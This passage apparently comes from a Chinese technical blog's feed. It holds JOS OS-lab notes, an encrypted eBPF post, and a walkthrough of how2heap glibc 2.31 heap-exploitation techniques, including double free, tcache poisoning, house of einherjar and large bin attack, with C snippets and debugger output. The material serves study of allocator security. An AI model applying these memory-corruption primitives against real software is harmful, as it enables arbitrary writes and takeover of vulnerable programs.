*%eax，这个指令要完成跳转，就会重新设置EIP的值，把它设置为寄存器eax中的值，而这个值是大于KERNBASE的，所以就完成了EIP从小的值到大于KERNBASE的值的转换。在entry_pgdir这个页表中，也把虚拟地址空间[0, 4MB)映射到物理地址空间[0, 4MB)上，所以当访问位于[0, 4MB)之间的虚拟地址时，可以把它们转换为物理地址。</p></blockquote><h3 id="Address-Space-Layout-Alternatives"><a href="#Address-Space-Layout-Alternatives" class="headerlink" title="Address Space Layout Alternatives"></a>Address Space Layout Alternatives</h3><p>进程的虚拟地址空间的布局不是只有我们讨论的这种唯一的情况，我们也可以把内核映射到低地址处。但是JOS之所以要这么做，是为了保证x86的向后兼容性。只要我们能够仔细设计，虽然很难，但是我们也能设计出来一种内核的布局方式，使得进程的地址空间就是从0到4GB，无需为内核预留一部分空间，但是仍然能够保证，用户进程不会破坏操作系统的指令，数据。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>大体上做了三件事：</p><ol><li><p>提供管理物理内存的数据结构和函数，如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab2/lab2_7_%E6%80%BB%E7%BB%93_%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.png" alt="JOS物理内存管理"></p></li><li><p>提供修改页目录和页表的函数，从而达到虚拟页和物理页的映射的目的：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab2/lab2_8_%E6%80%BB%E7%BB%93_%E9%A1%B5%E8%A1%A8%E7%AE%A1%E7%90%86%E5%87%BD%E6%95%B0.PNG" alt="JOS页表管理"></p></li><li><p>用前面两部分的函数建立内核的线性地址空间。内核的线性地址空间到物理内存的映射可总结为下图：</p></li></ol><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab2/lab2_5_lab2%E5%90%8E%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%88%B0%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E6%98%A0%E5%B0%84.png" alt="JOS内核线性地址空间按"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;lab2中多出来了几个文件：&lt;/p&gt;
&lt;p&gt;inc/memlayout.h&lt;/p&gt;
&lt;p&gt;kern/pmap.c&lt;/p&gt;
&lt;p&gt;kern/pmap.h&lt;/p&gt;
&lt;p&gt;kern/kclock.h&lt;/p&gt;
&lt;p&gt;kern/kclock.c&lt;/p&gt;
&lt;p&gt;memlayout.h描
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【eBPF】Overview</title>
    <link href="https://billyotry.github.io/2021/07/28/%E3%80%90eBPF%E3%80%91Overview/"/>
    <id>https://billyotry.github.io/2021/07/28/%E3%80%90eBPF%E3%80%91Overview/</id>
    <published>2021-07-28T13:56:10.634Z</published>
    <updated>2021-07-28T15:11:34.398Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fd43914a7a4b48ea9b1544ca548e8a027c8279f74e54fadb25bd468a772066b1">60c8fb4a25acc80be70b6eda0913804634b0eab35fd83bcfcaa9879cf933cfe4d23ea146798578d753de426c9106acc8a16649dc7535f4180445923d9930e4b129413e04e3de1b8e1f0b5ddfc600489c0bb66ada6368c35183af01bf7ed78b5c650bc08236b6439a7097a1bd5284ddfad1efd00db10a32cc9febb14e8cbfc5c32087c22ae2c0b5183923a757e7c196529184ce917d46c1cc3a6f580f8c069b0227133d55457f1935be53618ba722691472ea0462d510f095c1b76a71b848081efbf6f4b2959b5b7fb1a6055844f28742b27b3ea2894e7d3085851a50a8c9a55b6b83ba85a1ec790999a3ff175a71431c35008eb233e47d7b644705b3ef4c4ba14decc15ff9f146c1e0fb321ecdbaecf9ff30e7f72a4e063c7091b1f8bb66dbb97ab26e5002919bd7b1e37cf6d4966c93ded5fc7698f10d5c8a5c0c126fded1c25a48cd34f5296af66d2995e413817fba0495f1cec3e93143a84fc8efd04b4afde2de9905b8d24476cdea508d8cdaa7826397434ee14bea64a48e1daa1a3345bb3de9c1e03a4ea1bcc1083eb638c13eaa6c3bef02e6c68cc74de1d5520de96952a20a9b2e704c7525e9f0454eb0abbad84460e47e9fc2562ff016f6d87125b6fbde36ba9e5dfca54177e5736a5fd4b4fd8776ab419fb81472bfa31a33319f97740f396e9a2b319e86f2bf19cbbe4140fa13220140b786ef97bf4ee72a34d9c4ae9e2a86ae1cb6613e59ce108e0953a4bd2eb9d5c7aab7239489abcc232120e1a334c8a266bfb0908e66c76c01272dde79a4c38e0b24d7f103d2284d8f3907c5cd41271572c0bb8e0613bdf20a8845e9cbbb8be31eb9b21bc3b7f3bdb72a7766af56db3038c5efccc85ddee130ad8aaec710f419091113af779f78ef10c623b816c5cbfa459009192c6433dcb017bb73dd586657c6b6d93255d1f6c315da1683886777379b294b140092bcc020c486b12b15cabe66bc3d07c77da8fde8ad42c155565ee81ba20620e16811556bce94a1a544d72f852a7db3208ff993ab09a63b727b04f0632cfc975c29acd4d0d45ee1ce23ee61a81bfa95c60be81bb4930e32423bbdbf4c873d2f4c90dbcb1fa2a45a82a0dfa6830c0055aa89dc7b3bce1201774a9d15c3149251d5499ede1b1fcc08a877843eac16b18dd818987ce10c0cf460e495eaee0ff56fda3e8756afc5f3717e1fd90c592ee69187225e89a997b3cdfbab5836c4ea66aacdf69b86a67350c457f6cc06d2b8d52a99a8f5bb88f87024f3f8614b8f9e27cb9fb47191e152c2159093c42a275334ed9f674885bfb52b359a22748448b55bdebb72c70b678218f212975401ca2e12233e758c422ec17d3bfcc5cc50eb53a4af9a62be1f56e1d82377deadaa03ec0a3bb0bde1859345bef10dfea4a55f32481587c02fa8b7eaf89ad6d0d09b6410d4d5512a4ce992788c837d4c5acd64b0f968461a17862f144629f3293818c303c3e4e583c504f2006f7e6fd3b4e1ab8557ebe0ebf0a1d64a80cb951ce76bab6bec0d20e45e968cea4669f5bc6a376665388d0c68ce82619a08c627ed9091dd3a15627764937b7c3586dc7fb2e32e12c03e931143e6d97610be422355c162c128a376ce6e03b081d153c67e0bf0bfdadef9c3121b1b828bf502bf34db0ebed5441030e6a5489e0911d6f72cc55d6ae61804d503a89f5785c102055c682935b84e76eeb858d3eabd178f1d7f3e6bcdac7dad2c9e5a1bf3cd023dd5edb7aec3059b926c34a3be82ee2b38fdf73e2cf00546174fbe0621f748ae89428ec41fad5aec9710c1ac6b7876d29dc430333fad4d0f6f991585189d90f02dc291743d0ed532a98a7e9fa7c39b318aee4c0e94da89a7e327df7799fda2370c778f06945b90d13c17ad38d2715f3774cd58698a54efbfaa6f9afb542061a89f996285bbc50e97eb1fde22a658d36313a19e8b7633d9dcde0295d9c041d1ffa2f94dba8acb317aef87065cdd646b7875b0161e65f4e6a511281d049633339c87b4df5794633db2c4e8c27756f8efe8579e8eddd3b8093acae27c9a8a8ae5b655292e514333003cc05bde56e6910a3608b0b5edfa7c244295691944b5f507aafd300428cb3d895ffda9029b01ebdf2b1238bd6b785e1f2b1dc833aa8cf223667a5477ae22f46483d70a17bb71f371cc5d11cc5f87a2b182859f6b97b4e28c7f35227d124864819db52b7698ab7731df47c59c76d13b4a4955506c4b3b90a4908739bb21d344eff2e3fbaa28bc1d8f68415f831fbe46604e1974d1fc41b1f58122216ad7b1a13ccdd0f786996f269913bf97fa254f2556a768636ae0f9767ef1bcc98c7cf8bb333de16dce3b744ddc350fb4cf4acf9ee0b529d34dc3854ff7bfdf926ea03a8107cfb5f7a43e859a7bc35c1cc903a666674306cb712cd7cdd1eb2a4deeb49ed2a8d6b46f7d41e94ba7d729df5bbafb67fd04278540bb554ecceaa083b6c72e3ae46ad44d19f1fd0ae32e522192f644398ac9df0175b03a7b6beb3a9b109b80e409e01792ab280316ef5cf08e8349d598de2e51a59aa377791598ac7d60a8628aec35c945c593bc367cff419349df53697c76fe83cf04a171ab5271c3abdf8dba366c9d00fe9e20d765cf0a994178151215099c57bde43c8b339f3180833b97c26164137e8c9e43e4c3e6c6bd986d48d0d7a54d5e9c919eda0600ec93ffbaf0d96d4c3fa786d62128531c9bc4c0dbdbb85ebc110a9aee1e6c42e403fbc0ef8747e7518aafff5dd66787ea098407ae1ee227e35f912d5d6e8c2d9c53a1e9fcd55401acc6a3a75a4e3e2543764f18c332a95af3257fb8f17157f47c2c6e12ae4086e6028eff549e3d8c6e6721af49a0f2c9e71f1ed00b0f8a59b7d8c517749d80f7c0a0b372efd77941f130d01528d7952f2bfbcfb5f0f6b5b99708025c6189cc21cdb587b657e6f86be0985798e103b410f501590db98d211bf342d6f8b0afe8808e94bbebe18daf8f736a7a3f4feabda28e8a142c96afa0ed9bb51999ba01bcce4e285123615409ef6577adbe6b4eda6b18c69baa19aff13894b4ad5140fc1b0083534ebf45946ac72c0f951c12a0a20698fc0a8c4dc81d8ab5871221df08cc5a636d97b605836fa22e4cdb52a2494ee33ecc20b275bd6b35ede6a89dfdb35ae74e1ade423c0a3d9a12e80218316492814780c45c074993933a21a5019def3786167cc575007313e8164e96208ad93ce588ef5349cdc08fd6a5dbe186acc597169aaae07d12d9d91e4c54dc111d26f5714b102dda88b15e4f90a617fe7e32cdc118b407339561b816d8ed818973fcbcf963d507e625a6813e1cf069f36285230f61e18f118ed2e5d17363ccd026875839b0466781c60f4c20969c28e2210ec91aaa237f05e0ba0f1e82854ba2b900ff165c2d5895af266540f394d2b1fba73b26ebebaf4a63a6caaaaff70e5498e69c35d11b8d3732d07f3dc9708083c2fb5428b0fd4096c244e9f04b9227b41e1ad85f11e2d766350fd2856774ef875c2f3f157a916a04e7ae2f3a47b9141726095596b61918859eb41665b97daa86551899f44840493021c0f3e97b60cf94ef4fdd1c70e625b5ab46fee7f7c1a7105af54cada2e6fbe527bd952d1c057c3f31c0562e810689ba5a6fa138ace228c621e7006d71ee5bcf7190d7a574ae31bcfb078c58653089b1b5321ae4e54f32e8e17d9c9ef0b651c2d9a2a3ba2ad93b1feed47e6d941c1d0a0077c98a3e753cb184c879d219f16500053b04c03c5017a7554c8f8ad76d6ec201701ef495d7a086c2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="Kernel" scheme="https://billyotry.github.io/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>Educational Heap Exploitation 2.0 (how2heap glibc 2.31)</title>
    <link href="https://billyotry.github.io/2021/07/17/Educational%20Heap%20Exploitation%202.0%20(how2heap%20glibc%202.31)/"/>
    <id>https://billyotry.github.io/2021/07/17/Educational%20Heap%20Exploitation%202.0%20(how2heap%20glibc%202.31)/</id>
    <published>2021-07-17T09:36:04.750Z</published>
    <updated>2021-06-06T15:19:41.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h2><p>关于 fastbin attack 在glibc 2.31 上没有什么变化，这里给的样例是通过 double-attack 漏洞修改构造两个指针指向同一个 chunk 的情景</p><p>程序首先 malloc 了 8 此，然后 free 了 7 次（用来填充tcache bins）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 tcache bins 已经填满</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618049605/0" alt="image-20210605215153140"></p><p>然后用 calloc 分配了 3 个chunk，使用 calloc 分配的时候，此时不会从tcache bins拿已经 free掉的 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>然后进行 double free 操作即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>至此怎么利用懂得都懂，就不多说了</p><h2 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h2><p>首先分配一定数量的chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">   ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后 free 填充我们的 tcache bins</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618069283/0" alt="image-20210605215933226"></p><p>释放我们的目标 chunk 即 ptrs[7]</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">  <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">  victim</span><br><span class="line">);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure><p>接着释放剩下的 8 - 14 的chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>此时的bin</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618081765/0" alt="image-20210605220337747"></p><p>假设我们有一个堆溢出漏洞，可以覆盖 victim 的内容，我们此时将栈上一个构造好的list的地址赋予 victim</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">*(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>此时的victim如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618090767/0" alt="image-20210605220650657"></p><p>接下来我们 malloc 7次，清空 tcache bin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Empty tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现 fastbin 的最后一个 chunk 的 fd 被我们改成了 stack 的地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618097007/0" alt="image-20210605220931514"></p><p>此时我们malloc一次，会发现</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618102417/0" alt="image-20210605221133082"></p><p>此时，原本在 fastbin 的chunk list 都被放到了 tcache bins里</p><p>如果我们最后再malloc一次，我们就能拿到栈地址（ tcache 不检查size域）</p><p>这里具体为什么会这样，我也8知道，我调试发现首先会从fastbin的链表头开始将chunk放入tcache</p><p>我猜测可能是fastbin大于7个的时候，就会这样，并且是从fastbin链表头开始，所以进入到tcache的时候就会返过来。</p><p>后面就不用说了，再次分配就能分配到栈上了。</p><h2 id="3-house-of-botcake"><a href="#3-house-of-botcake" class="headerlink" title="3. house_of_botcake"></a>3. house_of_botcake</h2><p>一种 tcache poisoning attack ，通过一些手段，在tcachebins 中写入目标地址</p><p>此时我们的tcache bin被填满</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618161189/0" alt="image-20210605223658518"></p><p>然后我们 free a 再 free prev，由于 prev 与 a 是相邻 chunk，所以会触发合并</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><p>触发合并后，在 unsorted bin 里的是 prev chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618196491/0" alt="image-20210605225221216"></p><p>然后我们要想办法把 chunk a 放入tcache bin里，由于此时tcache bin 是满的，所以我们先取一个出来，然后在 free 一次 a。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"><span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br></pre></td></tr></table></figure><p>此时 a chunk 就会被放入 tcahcebins 里，同时 prev 可以控制 chunk a 的内容</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618201263/0" alt="image-20210605225447090"></p><p>所以我们从此时的 unsortedbin 给他分一块出来，然后修改其 fd 的值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618223423/0" alt="image-20210605230443691"></p><p>那么此时我们就成功污染了 tachebin 的内容</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618224833/0" alt="image-20210605230517758"></p><p>我们接着只需要两次 malloc 就能拿到 0x7fffffffddc0 这个地址</p><p>其实就chunk_overpaping，一个大的chunk，包含了一个chunk，堆风水有什么好学的（逃</p><h2 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h2><p>这里展示的是通过一字节溢出，取到任意地址的技术</p><p>首先在堆上伪造一个 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618291214/0" alt="image-20210605233802077"></p><p>我们再申请chunk b和chunk c </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618294763/0" alt="image-20210605234002884"></p><p>然后此时假设我们有一个一字节溢出，可以覆盖到 c chunk 的size域，此时chunk c的pre inuse位置零，从0x101变成了0x100，因为新版本的原因，我们还要伪造pre_size为0x60</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618323935/0" alt="image-20210605235608527"></p><p>紧接着，照样填满 tcache, 然后我们去free chunk c，由于 chunk c 的 prev_inused 为0，则认为前面的 chunk 是free 的此时会有一个向前合并的过程,这样我们就会有两个指针指向 fake chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618328608/0" alt="image-20210605235838014"></p><p>然后我们此时再 malloc 一个 0x158 大小的chunk ，合并后大小为 0x160, 然后此时 合并后的 chunk 就会被整块取出,</p><p>然后我们在进行如下操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line"><span class="built_in">free</span>(pad);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>那么此时 chunk b 也会加入到 tcache bin里，且指向了刚 free 的 pad chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618337803/0" alt="image-20210606000151527"></p><p>由此， chunk d 可对 chunk b进行任意修改 （堆块重叠了）</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618353003/0" alt="image-20210606000442998"></p><p>接下来怎么做就不讲了</p><h2 id="5-large-bin-attack"><a href="#5-large-bin-attack" class="headerlink" title="5. large_bin_attack"></a>5. large_bin_attack</h2><p>通过该技术向目标地址写入一个大值</p><p>2.30 之后关于 largs bin 的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加了两个检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted </span></span><br><span class="line"><span class="string">(nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>导致传统的 large bin attack 没法使用</p><p>但是存在一个新的利用路径:</p><p>首先分配如下堆块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"><span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br></pre></td></tr></table></figure><p>0x20 的为 guard chunk，避免 free 之后 chunk 合并，然后我们 free p1，此时 chunk p1会放入unsorted bin</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619120901/0" alt="image-20210606104412366"></p><p>然后我们再 malloc 一个比 p1 大的 chunk（我猜是为了不切割 p1），此时 p1 会被放入到 largebin</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619123801/0" alt="image-20210606104519006"></p><p>然后我们再 free p2（p2 大小小于 p1和p3），此时 p2 就会被放入到 unsorted bin里</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619134703/0" alt="image-20210606104906680"></p><p>然后我们修改 p1 的bk_nextsize 指向 target-0x20，此时 p1 在 largebin 里</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619506350/0" alt="image-20210606130910387"></p><p>然后我们再 malloc 一个比 p2 大的 chunk（此时 p2 在unsorted bin 里），那么此时，就会将 p2 从unsorted bin取出，放入到largebin 里，那么就存在如下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 victim 是 p2 ，fwd为largebin表头，bck为 largebin 中的最后一个chunk，也就是最小的那个，也就是我们这里的 p1</p><p>最后的效果就是</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619984845/0" alt="image-20210606161034580"></p><p>通常而言，这种写大数的行为，我们可以用来修改 <code>global_max_fast</code>。这里为什么想到的，估计是根据victim-&gt;bk_nextsize可控，那么victim-&gt;bk_nextsize-&gt;fd_nextsize可控就能写入一个vitcim。那么为什么victim-&gt;bk_nextsize，反推回去就是fwd-&gt;fd-&gt;bk_nextsize可控，这个可控翻译过来<strong>其实就是largebin中链表尾部，也就是最小的那个chunk的bk_nextsize可控，然后再其中写入 目标地址-0x20</strong></p><h2 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6. overlapping_chunks"></a>6. overlapping_chunks</h2><p>通过修改 size 造成堆重叠，然后拿到两个指针指向同一个chunk</p><p>首先分配如下chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620159097/0" alt="image-20210606170537795"></p><p>然后修改 p2 的大小为 p2+p3</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620165603/0" alt="image-20210606170731428"></p><p>然后释放p2</p><p>再分配一个新的大小符合修改之后的 chunk，可以把修改完 chunk 之后的 p2+p3 重新分配回来</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620189326/0" alt="image-20210606171331954"></p><p>可以看到 p4 将 p3 包含进去了</p><h2 id="7-mmap-overlapping-chunks"><a href="#7-mmap-overlapping-chunks" class="headerlink" title="7. mmap_overlapping_chunks"></a>7. mmap_overlapping_chunks</h2><p>在Glibc中，有一个点，当一个分配是如此之大，以至于malloc决定我们需要一个单独的内存部分来处理它，而不是在正常的堆上分配它。这是由于mmap_threshold var. 代替正常的获取块的逻辑，系统调用Mmap。这将分配一段虚拟内存，并把它还给用户。同样，释放的块不是还给bin或堆的其他部分，而是使用另一个syscall。Munmap，它接受一个先前分配的Mmap块的指针，并将其释放回内核。Mmap chunks在大小元数据上有一个特殊的位；第二位，如果这个位被设置，那么这个块就被分配为一个Mmap块。</p><p>Mmap分块有一个prev_size和一个size。大小代表当前的 分块的大小。一个chunk的<em>prev_size</em>表示剩余的空间。的大小（不是直接低于大小的分块）。然而，fd和bk指针并没有被使用，因为Mmap chunks并没有返回到 的大小，就像GLibC Malloc中的大多数堆块一样。释放后， 分块必须是页面对齐的。 下面的POC本质上是一个重叠的chunk攻击，但在mmap chunks上。这和<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c</a> 非常相似。主要的区别是，mmapped chunks有特殊的属性，并且是 以不同的方式处理，创造出与正常情况下不同的攻击场景。重叠的分块攻击。还可以做其他的事情。如munmapping系统库、堆本身和其他东西。 这只是一个简单的概念证明，目的是为了证明一般的 的方法来执行对 mmap 分块的攻击。 关于GLibC中mmap chunks的更多信息，请阅读这篇文章。<a href="http://tukan.farm/2016/07/27/munmap-madness/">http://tukan.farm/2016/07/27/munmap-madness/</a></p><p>首先分配几个大的 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br></pre></td></tr></table></figure><p>此时我们可以知道 mmap_chunk_3 的 prev_size 和 size 分别为 0 和 0x101002</p><p>假设我们有一个漏洞可以修改 size，将其改为 0x202002，然后我们free mmap_chunk_3</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620838707/0" 